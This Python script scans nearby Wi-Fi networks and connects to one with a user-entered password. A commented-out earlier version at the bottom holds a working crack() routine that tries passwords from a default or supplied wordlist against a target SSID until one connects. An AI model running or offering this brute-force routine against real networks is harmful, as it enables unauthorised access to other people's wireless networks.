import pywifi
from pywifi import const
import time
from banner_cli import gtxt, rtxt, ctxt, mtxt, lmtxt, lbtxt, ytxt
from tqdm import tqdm


items = []
finall = []
max_ssid  = []


def scan_near_wifi():
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]
    # print(interface.name())
    for i in tqdm(range(1)):
        interface.scan()
        time.sleep(3) 
        x = interface.scan_results()
        if len(x) != 0:
            for i in x:
                items.append([i.ssid, i.bssid, str(i.freq)])
            
        for i in items:
            if i not in finall:
                finall.append(i)


    if len(finall) != 0:
        txt = '     INDEX    ''|''     SSID     ''|''       BSSID        |    FREQUENCY    '
        txt = '----------------------------------------------------------------------------'
        res = '      5         |      ALI         |   ff:ff:ff:ff:ff:ff  |                 '       

        for i in finall:
            max_ssid.append(len(i[0]))
        longest = max(max_ssid)

        ctxt('INDEX'.center(15), end='')
        mtxt('|', end='')
        ctxt('SSID'.center(int(longest+6)), end='')
        mtxt('|', end='')
        ctxt('BSSID'.center(24), end='')
        mtxt('|', end='')
        ctxt('FREQUENCY'.center(17))
        mtxt('-'*(5+1+4+1+5+1+8+longest+24+16))
        '     INDEX     |                 SSID                 |          BSSID         |    FREQUENCY    '
        # for i in finall:
        #     print(i)

        for i in finall:
            index_c = str(finall.index(i)).center(15)
            name_c = str(i[0]).center(int(longest+6))
            bssid_c = str(i[1]).center(24)
            freq_c = str(((float(i[2]))/1000000).__round__(1)).center(17)

            ctxt(index_c, end='');mtxt('|', end='');ctxt(name_c, end='');mtxt('|', end='');ctxt(bssid_c, end='');mtxt('|', end='');ctxt(freq_c)

    elif len(finall) == 0:
        rtxt('[!]    NOTHING FOUND !')


def connect_2_wifi(ssid, password):

	profile = pywifi.Profile()
	profile.ssid = ssid
	profile.auth = const.AUTH_ALG_OPEN
	profile.akm.append(const.AKM_TYPE_WPA2PSK)
	profile.cipher = const.CIPHER_TYPE_CCMP
	profile.key = password
	wifi = pywifi.PyWiFi()
	iface = wifi.interfaces()[0]
	profile = iface.add_network_profile(profile)
	iface.connect(profile)
	time.sleep(5)
	if iface.status() == const.IFACE_CONNECTED:
		gtxt("[+]    CONNECTED SUCCESSFULLY !")
	else:
		rtxt("[!]    CONNECTION FAILD !")



def wifi_runner():
    try:
        mtxt('[~]    1- SCAN NEAR WIFI\n       2- CONNECT TO WIFI')
        ctxt("\n[?]    ENTER YOUR CHOICE : ", end='')
        uc = input()
        if uc == '1':
            scan_near_wifi()
        elif uc == '2':
            lmtxt("[?]    ENTER YOUR SSID : ",end='')
            name = input()
            mtxt("[?]    ENTER YOUR PASSWORD : ",end='')
            passw = input()
            connect_2_wifi(ssid=name, password=passw)
        else:
            rtxt('[!]    ERROR OCCURRED IN WIFI PROG !')
    except Exception as er:
        print(er)
        rtxt('[!]    ERROR OCCURRED !')
        

if __name__ == '__main__' :
    wifi_runner()
















# import pywifi
# from pywifi import const
# import time
# from banner import gtxt, rtxt, ctxt, mtxt, lmtxt, lbtxt, ytxt
# from tqdm import tqdm

# default_pass_list = ['mmd', 'ali', 'testnet1', 'csdc', 'vd']

# available_devices = []
# second_scan = []


# # pass_file = open(r"C:\Users\#AR\Desktop\tool box\New folder\top400.txt", 'r')
# # x= pass_file.readlines()
# # extract_pass = list()
# # for i in x:
# #     extract_pass.append(i.replace('\n', ''))
# # password_list = extract_pass
# # print(extract_pass)


# def scan_near_wifi():
#     wifi = pywifi.PyWiFi()
#     interface = wifi.interfaces()[0]
#     # print(interface.name())
#     for i in tqdm(range(3)):
#         interface.scan()
#         time.sleep(3) 
#         x = interface.scan_results()
#         if len(x) != 0:
#             for i in x:
#                 available_devices.append(i.ssid)
#             for i in available_devices:
#                 if i not in second_scan:
#                     second_scan.append(i)
#     if len(second_scan) != 0:
#         ctxt(' INDEX ', end='')
#         mtxt('|',end='')
#         ctxt('   SSID')
#         mtxt('-----------------------')
#         for i in second_scan:
#             if i == '':
#                 name = 'Hidden Network'
#             else:
#                 name = i
#             time.sleep(0.1)
#             index = str(second_scan.index(i))
#             if len(index) == 1:
#                 ctxt(f'   {index}   ', end='')
#                 mtxt(f'|', end='')
#                 ctxt(f'   {name}')
#             elif len(index) == 2:
#                 ctxt(f'   {index}  ', end='')
#                 mtxt(f'|', end='')
#                 ctxt(f'   {name}')                
#     elif len(second_scan) == 0:
#         rtxt('[!]    NOTHING FOUND !')

# def crack():
#     # --------------------------------------------------------------------------
#     lbtxt('[~]    1- DEFAULT PASSWORD LIST \n       2- EXTERNAL PASSWORD LIST')
#     ucc = input('[?]    YOUR CHOICE : ')
#     if ucc == '1':
#         password_list = default_pass_list 
#     elif ucc == '2':
#         lbtxt('[?]    ENTER YOUR PASSWORD LIST PATH : ', end='')
#         password_list_path = input('')
#         pass_file = open(rf'{password_list_path}', 'r')
#         lines = pass_file.readlines()
#         extract_pass = list()
#         for i in lines:
#             extract_pass.append(i.replace('\n', ''))
#         password_list = extract_pass
#     lbtxt('[?]    ENTER YOUR TARGET SSID : ',end='')
#     ssid = input()
#     # ---------------------------------------------------------------------------
#     profile = pywifi.Profile()
#     profile.ssid = ssid
#     profile.auth = const.AUTH_ALG_OPEN
#     profile.akm.append(const.AKM_TYPE_WPA2PSK)
#     profile.cipher = const.CIPHER_TYPE_CCMP

#     ytxt("[!]    CRACKING STARTED !")
#     for i in password_list:
#         profile.key = i
#         wifi = pywifi.PyWiFi()
#         iface = wifi.interfaces()[0]
#         profile = iface.add_network_profile(profile)
#         iface.connect(profile)
#         time.sleep(1)
#         if iface.status() == const.IFACE_CONNECTED:
#             mtxt("[+]    SUCCESSFULLY CRACKED - THE PASSWORD IS ",end='')
#             ctxt(f'{i}')
#             break
#         else:
#             rtxt(f"[!]    WRONG PASSWORD -> {i} ")
	

# def connect_2_wifi(ssid, password):

# 	profile = pywifi.Profile()
# 	profile.ssid = ssid
# 	profile.auth = const.AUTH_ALG_OPEN
# 	profile.akm.append(const.AKM_TYPE_WPA2PSK)
# 	profile.cipher = const.CIPHER_TYPE_CCMP
# 	profile.key = password
# 	wifi = pywifi.PyWiFi()
# 	iface = wifi.interfaces()[0]
# 	profile = iface.add_network_profile(profile)
# 	iface.connect(profile)
# 	time.sleep(5)
# 	if iface.status() == const.IFACE_CONNECTED:
# 		gtxt("[+]    CONNECTED SUCCESSFULLY !")
# 	else:
# 		rtxt("[!]    CONNECTION FAILD !")



# def wifi_runner():
#     try:
#         mtxt('[~]    1- SCAN NEAR WIFI\n       2- CRACK WIFI WITH PASSWORD LIST\n       3- CONNECT TO WIFI')
#         ctxt("\n[?]    ENTER YOUR CHOICE : ", end='')
#         uc = input()
#         if uc == '1':
#             scan_near_wifi()
#         elif uc == '2':
#             crack()
#         elif uc == '3':
#             lmtxt("[?]    ENTER YOUR SSID : ",end='')
#             name = input()
#             mtxt("[?]    ENTER YOUR PASSWORD : ",end='')
#             passw = input()
#             connect_2_wifi(ssid=name, password=passw)
#         else:
#             rtxt('[!]    ERROR OCURRED IN WIFI PROG !')
#     except Exception:
#         rtxt('[!]    ERROR OCCURRED !')
        

# if __name__ == '__main__' :
#     wifi_runner()
